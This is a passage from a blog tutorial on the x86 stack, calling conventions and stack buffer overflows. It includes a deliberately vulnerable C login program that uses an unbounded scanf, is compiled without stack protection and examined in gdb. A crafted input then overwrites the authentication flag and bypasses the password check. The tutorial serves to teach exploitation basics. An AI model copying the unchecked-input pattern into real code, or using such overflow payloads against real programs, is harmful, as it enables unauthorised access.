</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>A</span>(<span style=color:#66d9ef>int</span> a) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>B</span>(<span style=color:#ae81ff>3</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>B</span>(<span style=color:#66d9ef>int</span> b) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> local_var1;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> local_var2;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The stack for this code when C is called will look like this:</p><pre tabindex=0><code>Higher Memory Addresses (0xFFFFFFFF)
↑
|
|                    STACK GROWTH DIRECTION
|                           ↓↓↓
|
+------------------+
|   Arguments      |  ← Arguments for function A (if any)
|   for A          |
+------------------+
|   Return Addr    |  ← Where to return after A finishes (e.g., main)
|   to main        |
+------------------+
|   Saved EBP      |  ← main&#39;s base pointer
|   (main&#39;s frame) |
+------------------+ ← EBP when A is executing (A&#39;s frame base)
|   A&#39;s Local      |
|   Variables      |
|   - local_var1   |
|   - local_var2   |
+------------------+
|   Arguments      |  ← Arguments pushed for B (right to left in C)
|   for B          |    e.g., arg2, arg1
+------------------+
|   Return Addr    |  ← Where to return in A after B finishes
|   to A           |
+------------------+
|   Saved EBP      |  ← A&#39;s base pointer saved
|   (A&#39;s frame)    |
+------------------+ ← EBP (Current frame base - B is executing)
|   B&#39;s Local      |
|   Variables      |
|   - local_var1   |
|   - local_var2   |
+------------------+ ← ESP (Stack pointer - top of stack)
|                  |
|   (Unused        |
|    Stack         |
|    Space)        |
|                  |
↓
Lower Memory Addresses (0x00000000)
</code></pre><h3 id=what-happens-during-a-function-call>What Happens During a Function Call<a hidden class=anchor aria-hidden=true href=#what-happens-during-a-function-call>#</a></h3><p>Now let&rsquo;s look at thx86 assembly code for what happens when a function is called</p><h4 id=1-callers-responsibilities-before-the-jump>1. Caller&rsquo;s Responsibilities (Before the Jump):<a hidden class=anchor aria-hidden=true href=#1-callers-responsibilities-before-the-jump>#</a></h4><p>First, the caller must save the return address—the location where execution should resume after the function completes. Let&rsquo;s see what happens when function A calls function B.</p><pre tabindex=0><code>push arguments_to_function_B (pushed in reverse order)
push next_instruction_address_of_function_A (the value in EIP register)
jmp address_of_function_B 
</code></pre><p>Sometimes the Caller can also decide to save all the values of general purpose registers to avoid losing its values from being overwritten by the caller.</p><pre tabindex=0><code>; Function A calling Function B with register preservation

function_A:
    ; ... A&#39;s code using registers ...
    mov eax, 100        ; EAX has important data
    mov ebx, 200        ; EBX has important data
    mov ecx, 300        ; ECX has important data
    
    ; Prepare to call B
    pusha               ; Push all general-purpose registers onto stack
                        ; Order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI
    
    push arguments_to_function_B    ; (pushed in reverse order)
    push next_instruction_address_of_function_A ; (the value in EIP register)
    jmp address_of_function_B

    popa                ; Restore all registers to their original values
                        ; Now EAX=100, EBX=200, ECX=300 again
    
    ; Continue with A&#39;s logic, registers are preserved
    ; ...
</code></pre><p>Most of the times callee&rsquo;s ABI clearly defines what register values are preserved and what can be overwritten, we can only save those registers instead.</p><h4 id=2-callees-responsibilities-function-prologue>2. Callee&rsquo;s Responsibilities (Function Prologue):<a hidden class=anchor aria-hidden=true href=#2-callees-responsibilities-function-prologue>#</a></h4><p>Once inside the function B, we need to set up a new stack frame:</p><pre tabindex=0><code>address_of_function_B:
    push ebp              ; Save the old base pointer (of function A)
    mov ebp, esp          ; Set EBP to current stack top (new frame base)
    sub esp, N            ; Allocate space for local variables (N bytes)
</code></pre><p>This sequence accomplishes three things:</p><ul><li>Preserves the caller&rsquo;s frame pointer (old EBP) so we can restore it late</li><li>Establishes a new base pointer for the current function</li><li>Allocates stack space for local variables by moving ESP downward</li></ul><h4 id=3-function-execution>3. Function Execution:<a hidden class=anchor aria-hidden=true href=#3-function-execution>#</a></h4><p>The function body executes, with local variables accessible via offsets from EBP:</p><ul><li><code>[ebp-4]</code> accesses the first local variable</li><li><code>[ebp-8]</code> accesses the second, and so on</li><li>Function parameters (if pushed by caller) are at <code>[ebp+8]</code>, <code>[ebp+12]</code>, etc.</li></ul><h4 id=4-callees-responsibilities-function-epilogue>4. Callee&rsquo;s Responsibilities (Function Epilogue):<a hidden class=anchor aria-hidden=true href=#4-callees-responsibilities-function-epilogue>#</a></h4><p>Before returning, we must tear down the stack frame and restore state:</p><pre tabindex=0><code>    mov esp, ebp          ; Deallocate local variables (restore ESP)
    pop ebp               ; Restore the old base pointer
    ret_address = pop()   ; Get return address from stack
    jmp ret_address       ; Jump back to caller
</code></pre><p>This will:</p><ul><li>Collapses the function B&rsquo;s stack frame by resetting <code>ESP</code> to <code>EBP</code></li><li>Restores the caller&rsquo;s base pointer</li><li>Retrieves the return address from the stack (saved by function A)</li><li>Jumps back to continue execution after the original call site</li></ul><h3 id=simplified-function-call-with-callretleave>Simplified Function Call with CALL/RET/LEAVE<a hidden class=anchor aria-hidden=true href=#simplified-function-call-with-callretleave>#</a></h3><p>The x86 instruction set provides three specialized instructions that automate this process:</p><h4 id=the-call-instruction>The CALL Instruction:<a hidden class=anchor aria-hidden=true href=#the-call-instruction>#</a></h4><pre tabindex=0><code>call function_address
</code></pre><p>This single instruction replaces:</p><pre tabindex=0><code>push next_instruction_address
jmp function_address
</code></pre><p>It automatically pushes the return address (address of the instruction following <code>call</code>) onto the stack and jumps to the target function.</p><h4 id=the-leave-instruction>The LEAVE Instruction:<a hidden class=anchor aria-hidden=true href=#the-leave-instruction>#</a></h4><pre tabindex=0><code>leave
</code></pre><p>This single instruction replaces:</p><pre tabindex=0><code>mov esp, ebp
pop ebp
</code></pre><p>It efficiently collapses the stack frame and restores the old base pointer in one operation.</p><h4 id=the-ret-instruction>The RET Instruction:<a hidden class=anchor aria-hidden=true href=#the-ret-instruction>#</a></h4><pre tabindex=0><code>ret
</code></pre><p>This single instruction replaces:</p><pre tabindex=0><code>pop eip          ; Pop return address into instruction pointer
jmp eip          ; Jump to return address
</code></pre><h4 id=complete-example-with-simplified-instructions>Complete Example with Simplified Instructions:<a hidden class=anchor aria-hidden=true href=#complete-example-with-simplified-instructions>#</a></h4><pre tabindex=0><code>; Caller side:
push argument2
push argument1
call my_function        ; Pushes return address and jumps
add esp, 8             ; Clean up arguments (caller cleanup)

; Callee side:
my_function:
    push ebp           ; Save old frame pointer
    mov ebp, esp       ; Set up new frame
    sub esp, 16        ; Allocate local variables
    
    ; ... function body ...
    
    leave              ; Equivalent to: mov esp, ebp; pop ebp
    ret                ; Pop return address and jump to it
</code></pre><h2 id=buffer-overflow-attacks>Buffer OverFlow Attacks<a hidden class=anchor aria-hidden=true href=#buffer-overflow-attacks>#</a></h2><h3 id=1-overflowing-a-variable-on-stack>1. Overflowing a Variable On Stack<a hidden class=anchor aria-hidden=true href=#1-overflowing-a-variable-on-stack>#</a></h3><p>Consider this C program</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>grantAccess</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Access Granted</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>checkPassword</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> password, <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>isAuthenticated) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strcmp</span>(password, <span style=color:#e6db74>&#34;admin123&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#f92672>*</span>isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>AuthenticateUser</span>() {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span>  isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> password[<span style=color:#ae81ff>8</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Enter password: &#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, password);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>checkPassword</span>(password, <span style=color:#f92672>&amp;</span>isAuthenticated);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isAuthenticated <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>grantAccess</span>();
</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Authentication Failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>AuthenticateUser</span>();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This is the normal working of the program</p><pre tabindex=0><code>$ gcc main.c
$ ./a.out
Enter password: password
Authentication Failed
$ ./a.out
Enter password: admin123
Access Granted
</code></pre><p>What if we don&rsquo;t know the correct password? Can we still gain access?</p><p>The vulnerability lies in <code>scanf("%s", password);</code> which performs no bounds checking. This allows us to write more than 8 bytes into the <code>password</code> buffer, potentially overwriting adjacent stack variables—specifically, the <code>isAuthenticated</code> variable.</p><p><strong>Stack layout when <code>AuthenticateUser()</code> is executing:</strong></p><pre tabindex=0><code>Higher Addresses
+-------------------------+
| Saved return address    | ← Return address to main()
+-------------------------+
| Saved RBP               | ← Previous stack frame base
+-------------------------+ ← RBP (current frame base)
| isAuthenticated (4 bytes) | ← [RBP-4]
+-------------------------+
| padding (if any)        |
+-------------------------+
| password[8]             | ← [RBP-12] (buffer starts here)
+-------------------------+ ← RSP (stack pointer)
Lower Addresses
</code></pre><p>Now let&rsquo;s compile another version of the code known as <code>vuln</code></p><pre tabindex=0><code>$ gcc -fno-stack-protector  -O0 -o vuln  main.c
</code></pre><p><strong>Why <code>-fno-stack-protector?</code></strong></p><p>The <code>-fno-stack-protector</code> flag disables GCC&rsquo;s Stack Smashing Protector (SSP), also known as Stack Guard or ProPolice.</p><p>The Stack Guard&rsquo;s main feature is stack canary - although the existence of stsck canary doesn&rsquo;t stop this attack, we still need to disable it because Stack Guard also reorders the variables in stack such that <code>isAuthenticated</code> appears after <code>password</code>, so we would never be able to rewrite the password.</p><p><code>-O0</code> will disable all compiler optimizations, so we can see all the assembly code.</p><p>Let&rsquo;s start by printing the disassembly of the key functions</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass AuthenticateUser
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> AuthenticateUser:
</span></span><span style=display:flex><span>   0x00000000000011fe &lt;+0&gt;:	endbr64
</span></span><span style=display:flex><span>   0x0000000000001202 &lt;+4&gt;:	push   rbp
</span></span><span style=display:flex><span>   0x0000000000001203 &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style=display:flex><span>   0x0000000000001206 &lt;+8&gt;:	sub    rsp,0x10
</span></span><span style=display:flex><span>   0x000000000000120a &lt;+12&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>rbp-0x4<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>   0x0000000000001211 &lt;+19&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xe04<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x201c</span>
</span></span><span style=display:flex><span>   0x0000000000001218 &lt;+26&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x000000000000121b &lt;+29&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x0000000000001220 &lt;+34&gt;:	call   0x1090 &lt;printf@plt&gt;
</span></span><span style=display:flex><span>   0x0000000000001225 &lt;+39&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000001229 &lt;+43&gt;:	mov    rsi,rax
</span></span><span style=display:flex><span>   0x000000000000122c &lt;+46&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xdfa<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x202d</span>
</span></span><span style=display:flex><span>   0x0000000000001233 &lt;+53&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x0000000000001236 &lt;+56&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x000000000000123b &lt;+61&gt;:	call   0x10b0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>   0x0000000000001240 &lt;+66&gt;:	lea    rdx,<span style=color:#f92672>[</span>rbp-0x4<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000001244 &lt;+70&gt;:	lea    rax,<span style=color:#f92672>[</span>rbp-0xc<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000001248 &lt;+74&gt;:	mov    rsi,rdx
</span></span><span style=display:flex><span>   0x000000000000124b &lt;+77&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x000000000000124e &lt;+80&gt;:	call   0x11c3 &lt;checkPassword&gt;
</span></span><span style=display:flex><span>   0x0000000000001253 &lt;+85&gt;:	mov    eax,DWORD PTR <span style=color:#f92672>[</span>rbp-0x4<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x0000000000001256 &lt;+88&gt;:	cmp    eax,0x1
</span></span><span style=display:flex><span>   0x0000000000001259 &lt;+91&gt;:	jne    0x1267 &lt;AuthenticateUser+105&gt;
</span></span><span style=display:flex><span>   0x000000000000125b &lt;+93&gt;:	mov    eax,0x0
</span></span><span style=display:flex><span>   0x0000000000001260 &lt;+98&gt;:	call   0x11a9 &lt;grantAccess&gt;
</span></span><span style=display:flex><span>   0x0000000000001265 &lt;+103&gt;:	jmp    0x1276 &lt;AuthenticateUser+120&gt;
</span></span><span style=display:flex><span>   0x0000000000001267 &lt;+105&gt;:	lea    rax,<span style=color:#f92672>[</span>rip+0xdc2<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x2030</span>
</span></span><span style=display:flex><span>   0x000000000000126e &lt;+112&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x0000000000001271 &lt;+115&gt;:	call   0x1080 &lt;puts@plt&gt;
</span></span><span style=display:flex><span>   0x0000000000001276 &lt;+120&gt;:	nop
</span></span><span style=display:flex><span>   0x0000000000001277 &lt;+121&gt;:	leave
</span></span><span style=display:flex><span>   0x0000000000001278 &lt;+122&gt;:	ret
</span></span><span style=display:flex><span>End of assembler dump.
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disass checkPassword
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> checkPassword:
</span></span><span style=display:flex><span>   0x00000000000011c3 &lt;+0&gt;:	endbr64
</span></span><span style=display:flex><span>   0x00000000000011c7 &lt;+4&gt;:	push   rbp
</span></span><span style=display:flex><span>   0x00000000000011c8 &lt;+5&gt;:	mov    rbp,rsp
</span></span><span style=display:flex><span>   0x00000000000011cb &lt;+8&gt;:	sub    rsp,0x10
</span></span><span style=display:flex><span>   0x00000000000011cf &lt;+12&gt;:	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>,rdi
</span></span><span style=display:flex><span>   0x00000000000011d3 &lt;+16&gt;:	mov    QWORD PTR <span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>,rsi
</span></span><span style=display:flex><span>   0x00000000000011d7 &lt;+20&gt;:	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x00000000000011db &lt;+24&gt;:	lea    rdx,<span style=color:#f92672>[</span>rip+0xe31<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x2013</span>
</span></span><span style=display:flex><span>   0x00000000000011e2 &lt;+31&gt;:	mov    rsi,rdx
</span></span><span style=display:flex><span>   0x00000000000011e5 &lt;+34&gt;:	mov    rdi,rax
</span></span><span style=display:flex><span>   0x00000000000011e8 &lt;+37&gt;:	call   0x10a0 &lt;strcmp@plt&gt;
</span></span><span style=display:flex><span>   0x00000000000011ed &lt;+42&gt;:	test   eax,eax
</span></span><span style=display:flex><span>   0x00000000000011ef &lt;+44&gt;:	jne    0x11fb &lt;checkPassword+56&gt;
</span></span><span style=display:flex><span>   0x00000000000011f1 &lt;+46&gt;:	mov    rax,QWORD PTR <span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>   0x00000000000011f5 &lt;+50&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,0x1
</span></span><span style=display:flex><span>   0x00000000000011fb &lt;+56&gt;:	nop
</span></span><span style=display:flex><span>   0x00000000000011fc &lt;+57&gt;:	leave
</span></span><span style=display:flex><span>   0x00000000000011fd &lt;+58&gt;:	ret
</span></span><span style=display:flex><span>End of assembler dump.
</span></span></code></pre></div><p>By looking at the assembly of <code>AuthenticateUser</code> we can pinpoint where <code>isAuthenticated</code> and <code>password</code> are located on stack.</p><ol><li><code>isAuthenticated</code> at <code>[rbp-0x4]</code></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x120a</span> <span style=color:#960050;background-color:#1e0010>&lt;+</span><span style=color:#ae81ff>12</span><span style=color:#960050;background-color:#1e0010>&gt;</span>: <span style=color:#66d9ef>mov</span>    <span style=color:#66d9ef>DWORD</span> <span style=color:#66d9ef>PTR</span> [<span style=color:#66d9ef>rbp-0x4</span>],<span style=color:#ae81ff>0x0</span>
</span></span></code></pre></div><p>this is writing 0 to the address [rbp-0x4], which is equivalent to the C code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> isAuthenticated <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;  <span style=color:#75715e>// Initialize to 0
</span></span></span></code></pre></div><ol start=2><li><code>password</code> is at <code>[rbp-0xc]</code></li></ol><p>We can just figure it out by looking at the arguments passed to <code>checkPassword</code></p><pre tabindex=0><code>0x1240 &lt;+66&gt;: lea    rdx,[rbp-0x4]             ; Load address of [rbp-0x4]
0x1244 &lt;+70&gt;: lea    rax,[rbp-0xc]             ; Load address of [rbp-0xc]
0x1248 &lt;+74&gt;: mov    rsi,rdx                   ; 2nd arg: &amp;isAuthenticated
0x124b &lt;+77&gt;: mov    rdi,rax                   ; 1st arg: password
0x124e &lt;+80&gt;: call   0x11c3 &lt;checkPassword&gt;
</code></pre><p>We know <code>rdi</code> contains first password and <code>rsi</code> contains second, from C code we can see first parameter is <code>password</code> and second parameter is <code>isAuthenticated</code>.</p><p>Now let&rsquo;s place a breakpoint right before this code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (isAuthenticated <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
</span></span></code></pre></div><p>We can spot the corresponding <code>cmp</code> assembly operation here</p><pre tabindex=0><code>   0x000000000000124e &lt;+80&gt;:	call   0x11c3 &lt;checkPassword&gt;
   0x0000000000001253 &lt;+85&gt;:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001256 &lt;+88&gt;:	cmp    eax,0x1
   0x0000000000001259 &lt;+91&gt;:	jne    0x1267 &lt;AuthenticateUser+105&gt;
   0x000000000000125b &lt;+93&gt;:	mov    eax,0x0
   0x0000000000001260 &lt;+98&gt;:	call   0x11a9 &lt;grantAccess&gt;
   0x0000000000001265 &lt;+103&gt;:	jmp    0x1276 &lt;AuthenticateUser+120&gt;
</code></pre><p>Note that <code>b *0x0000000000001256</code> won&rsquo;t work because the addresses we are seeing are the offsets in ELF. But since our binary is a PIE executable there will be a constant offset added, we can figure out the actual address using that offset or we can simply place it like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>  break *AuthenticateUser+88
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>4</span> at 0x555555555256
</span></span></code></pre></div><p>GDB allows this since the relative offsets will same and it is aware of the symbols.</p><p>Now let&rsquo;s enter the password</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>Enter password: AAAAAAAA1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Breakpoint 4, 0x0000555555555256 in AuthenticateUser <span style=color:#f92672>()</span>
</span></span></code></pre></div><p><code>AAAAAAAA1</code> is 9 bytes, just 1 byte more than password. Let&rsquo;s inspect the memory to confirm if the overflow happened.</p><pre tabindex=0><code>(gdb) x/12xb $rbp - 0xc
0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddfc:	0x31	0x00	0x00	0x00
(gdb) x/1dw $rbp - 0x4
0x7fffffffddfc:	49
</code></pre><p>Recall that <code>$rbp - 0xc</code> is the address of <code>password</code> and <code>$rbp - 0x4</code> is the address of <code>isAuthenticated</code>.</p><p>In first command we are printing 12 bytes from <code>0x7fffffffddf4</code> we can see 9th byte is <code>0x31</code> which is the ascii value of <code>1</code> we entered at the end.</p><p>But since the value stored is not <code>0x01</code> we can see the value of <code>isAuthenticated</code> is not <code>49</code> which will still fail the check.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>Authentication Failed
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Inferior <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>process 8454<span style=color:#f92672>)</span> exited normally<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Now we know that overflow actually works, we can actually try to voerwrite <code>0x01</code> into the address of <code>isAuthenticated</code>. This is the scenario we are hoping for</p><pre tabindex=0><code>0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffddfc:	0x01	0x00	0x00	0x00
</code></pre><p>Note that the bytes <code>0x01 0x00 0x00 0x00</code> appear reversed compared to the actual notation of 1 in 4-byte (word) format because this is little-endian representation.</p><p>The problem is the character whose ascii value is <code>0x01</code> is actually a non-printable character which means we can&rsquo;t type it into the terminal.</p><p>But we can pass raw byte stream using utilities like <code>printf</code> and pipe its output to our program</p><pre tabindex=0><code>$ printf &#39;AAAAAAAA\x01&#39; | ./vuln
Enter password: Access Granted
</code></pre><p>This proves that the overwrite worked in an expected way!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://sankethbk.github.io/blog/tags/vulnerabilities/>Vulnerabilities</a></li><li><a href=https://sankethbk.github.io/blog/tags/buffer-overflow/>Buffer Overflow</a></li><li><a href=https://sankethbk.github.io/blog/tags/reverse-engineering/>Reverse Engineering</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://sankethbk.github.io/blog/>Sanketh's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>